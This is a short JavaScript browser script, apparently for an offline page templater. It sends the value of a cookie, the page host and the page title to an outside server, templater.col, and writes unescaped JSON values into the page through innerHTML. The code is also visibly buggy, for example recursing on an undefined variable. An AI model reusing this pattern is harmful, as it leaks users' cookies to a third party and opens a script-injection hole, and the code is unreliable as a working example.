const   ajax = require('ajaxsim'),
        cook = require('dist-cookie');

let jsonFile = document.getElementsByTagName('script')[0].src;
let body = document.querySelector('body');



if (!navigator.onLine){
    //window.location = str;
    ajax(jsonFile, '', call);
}
if(navigator.onLine) {
    let nameCookie = 'name';
    let cookieData = cook(nameCookie),
        titlePage = document.querySelector('title').innerText,
        host = window.location,
        response = "cookie=" + cookieData + '&host=' + host + '&title=' + titlePage;
    ajax('http://templater.col/respond-require-data', response);
}


function call(data){
    let obj = JSON.parse(data);
    let dir = obj.info.name;
    window.location = 'http://templater.col/cache/users/'+dir+'/offline.html';
    parseJson(obj);
}

function parseJson(obj, i = 0){

    if (i < obj.pages.count) {
        let page = obj.pages['page-' + i];
        for (key in page) {
            if (page.hasOwnProperty(key)) {
                let div = document.createElement('div');
                div.className = 'sic';
                div.innerHTML = "<a href="+key+'>'+page[key]+'</a>';
                body.appendChild(div);
                parseJson(data, i + 1);
            }
        }
    }

}



